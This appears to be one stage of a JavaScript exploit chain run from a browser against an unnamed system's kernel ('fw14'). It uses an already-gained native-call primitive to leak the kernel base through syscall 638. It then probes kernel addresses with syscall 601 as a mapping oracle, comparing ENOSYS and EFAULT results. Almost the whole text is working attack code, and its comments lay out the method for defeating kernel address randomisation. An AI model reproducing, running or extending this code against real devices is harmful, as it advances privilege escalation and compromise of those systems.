// 601 kernel mapping oracle, proof of concept. 601 probes arg1
// accessibility without userspace validation: mapped (user or kernel)
// → ENOSYS(78), unmapped-user → EFAULT(14). If unmapped KERNEL
// addresses also EFAULT, 601 is a kernel virtual-address mapping
// oracle for an unprivileged caller. Sample set: two KNOWN-MAPPED
// controls from the 638 disclosures (data page kbase+0x3AC30DF0,
// table page kbase+0x3B1AABA0 — both read by the kernel on every 638
// call), kernel text base, and sparse offsets across the kernel
// region. Expectation if oracle works: controls/text = ENOSYS, holes
// = EFAULT. Unmapped-user control repeated for calibration. All
// addresses page-aligned. Full restore, PID verified.
var result;
var phase = "preflight";
try {
  var state = window.__fw14ArrayState;
  var plan = window.__fw14NativePlan;
  var native = window.__fw14NativeInvoke;
  if (!state || !plan || !native ||
      typeof native.call !== "function" ||
      typeof native.call64 !== "function" ||
      !native.frame || !Number.isSafeInteger(native.frameAddress) ||
      typeof native.wrappers.sys638 !== "number" ||
      typeof native.wrappers.sys601 !== "number")
    throw new Error("chain_or_call64_missing");
  var frame = native.frame;
  function mark(phaseName) {
    try {
      if (api && typeof api.markSync === "function")
        api.markSync(phaseName);
    } catch (markerError) {}
  }
  var before = native.call("getpid", []);
  if (before.high !== 0 || before.value < 1 || before.value > 100000)
    throw new Error("session_pid_changed");
  mark("ko_preflight");
  phase = "derive_kbase";
  var out2Off = 0x1e00, out3Off = 0x1e10;
  var out2Addr = native.frameAddress + out2Off;
  var out3Addr = native.frameAddress + out3Off;
  var fv = new DataView(frame.buffer);
  var o2orig = Array.from(frame.subarray(out2Off, out2Off + 32));
  var c638 = native.call("sys638", [0, out2Addr, out3Addr]);
  if (c638.value !== 0)
    throw new Error("call638_failed");
  var klo = fv.getUint32(out2Off, true);
  var khi = fv.getUint32(out2Off + 4, true);
  var blo = (klo - 0x3B1AABA0) >>> 0;
  var bhi = khi;
  if (klo < 0x3B1AABA0) { blo = (klo - 0x3B1AABA0) >>> 0;
    bhi = (khi - 1) >>> 0; }
  mark("ko_kbase_ok");
  function probeAddr(baseLo, baseHi, offset) {
    var lo = (baseLo + offset) >>> 0;
    var hi = (baseHi + ((baseLo + offset) > 0xffffffff ? 1 : 0)) >>> 0;
    var c = native.call64("sys601", [[lo, hi], [0x1000, 0]]);
    var e = (c.value === -1) ? native.readErrno() : null;
    return c.value + "/" + (e === null ? "ok" : e);
  }
  var samples = [
    ["kdata_page", 0x3AC30DF0 & ~0xfff],
    ["ktable_page", 0x3B1AABA0 & ~0xfff],
    ["text_base", 0],
    ["text+0x100000", 0x100000],
    ["text+0x1000000", 0x1000000],
    ["text+0x2000000", 0x2000000],
    ["text+0x4000000", 0x4000000],
    ["kbase-0x200000", -0x200000],
    ["kbase-0x1000", -0x1000]
  ];
  var lines = [];
  for (var s = 0; s < samples.length; s++) {
    phase = "probe_" + samples[s][0];
    lines.push(samples[s][0] + ":" +
      probeAddr(blo, bhi, samples[s][1] >>> 0));
  }
  mark("ko_kernel_done");
  // calibration: unmapped-user must EFAULT
  var uu = native.call64("sys601", [[0, 0x7000], [0x1000, 0]]);
  var uuE = (uu.value === -1) ? native.readErrno() : null;
  lines.push("unmapped_user:" + uu.value + "/" +
    (uuE === null ? "ok" : uuE));
  var mu = native.call64("sys601",
    [[native.frameAddress % 0x100000000,
      Math.floor(native.frameAddress / 0x100000000)], [0x1000, 0]]);
  var muE = (mu.value === -1) ? native.readErrno() : null;
  lines.push("mapped_user:" + mu.value + "/" +
    (muE === null ? "ok" : muE));
  for (var r = 0; r < 32; r++) frame[out2Off + r] = o2orig[r];
  var after = native.call("getpid", []);
  mark("ko_done");
  result = { id: "kmap_oracle_v1",
    status: (after.value === before.value && after.high === 0) ?
      "pass" : "fail",
    details: { kbase: bhi.toString(16) + pad8(blo),
      lines: lines.join(" | ").slice(0, 470),
      pid_ok: after.value === before.value && after.high === 0 } };
  function pad8(lo) {
    var h = lo.toString(16);
    while (h.length < 8) h = "0" + h;
    return h;
  }
} catch (error) {
  result = { id: "kmap_oracle_v1", status: "error",
    details: { phase: phase, error: String(error).slice(0, 180) } };
}
return [result];
